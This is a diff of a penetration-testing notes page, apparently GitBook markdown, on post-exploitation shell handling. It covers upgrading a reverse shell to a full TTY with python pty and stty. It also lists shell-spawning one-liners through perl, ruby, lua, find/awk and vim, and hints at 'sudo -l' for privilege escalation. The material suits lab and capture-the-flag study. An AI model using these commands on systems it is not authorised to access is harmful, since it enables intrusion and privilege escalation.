@@ -68,37 +68,97 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 <mark style="color:green;">We successfully got a connection back now it's time to make it more stable and efficient.</mark>
 {% endhint %}
 
-### Upgrading TTY:
+### Interactive Shells
 
 In order to upgrade our shell to a fully TTY let's follow these steps:
 
-1. Python/stty:
+#### Full TTY
 
 ```bash
 victim@target$ python3 -c 'import pty; pty.spawn("/bin/bash")'
-```
-
-2. Raw + Echoless  mode:
-
-```bash
 victim@target-host$ ^Z
 attacker@attacking-machine$ stty raw -echo && fg
 [Enter]
 [Enter]
 victim@target-host$
+# Terminal size :
+victim@target-host$ export TERM=xterm-256color
+victim@target-host$ stty rows 67 columns 318
+
+
+Raw mode: This means that characters are delivered to the application as soon as 
+they are typed, without any line buffering or special interpretation (such as Ctrl+C for interrupt).
+-echo: By turning off echoing, characters typed by the user won't be displayed on the screen.
 ```
 
 {% hint style="info" %}
-* <mark style="color:blue;">Raw mode:</mark> This means that characters are delivered to the application as soon as they are typed, without any line buffering or special interpretation (such as Ctrl+C for interrupt).
-* <mark style="color:blue;">-echo:</mark> By turning off echoing, characters typed by the user won't be displayed on the screen.
+Intuitively, since we're executing commands on a target machine, all of our work highly and directly  depends on the permissions of the files/binaries we're aiming to execute. So?
+
+sudo -l your way in in easy boxes :smile:
 {% endhint %}
 
-3. Adjusting the Terminal size:
+
+
+#### Bash
 
 ```bash
-victim@target-host$ export TERM=xterm-256color
-victim@target-host$ stty rows 67 columns 318
+victim@target$/bin/sh -i
+sh: no job control in this shell
+sh-4.2$
 ```
+
+#### Perl
+
+```bash
+victim@target$perl —e 'exec "/bin/sh";'
+
+#To be run inside of a perl script
+victim@target$perl: exec "/bin/sh"; 
+```
+
+#### Ruby
+
+```bash
+victim@target$ruby: exec "/bin/sh"
+```
+
+#### Lua
+
+```bash
+victim@target$lua: os.execute('/bin/sh')
+```
+
+#### Find
+
+```bash
+victim@target$find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+#Example:
+find . -exec /bin/sh \; -quit
+```
+
+#### Vim
+
+```bash
+victim@target$vim -c ':!/bin/sh'
+```
+
+```bash
+victim@target$vim
+:set shell=/bin/sh
+:shell
+```
+
+
+
+
+
+
+
+
+
+
+
+
 
 {% hint style="success" %}
 <mark style="color:green;">Now we can use the full terminal features.</mark>
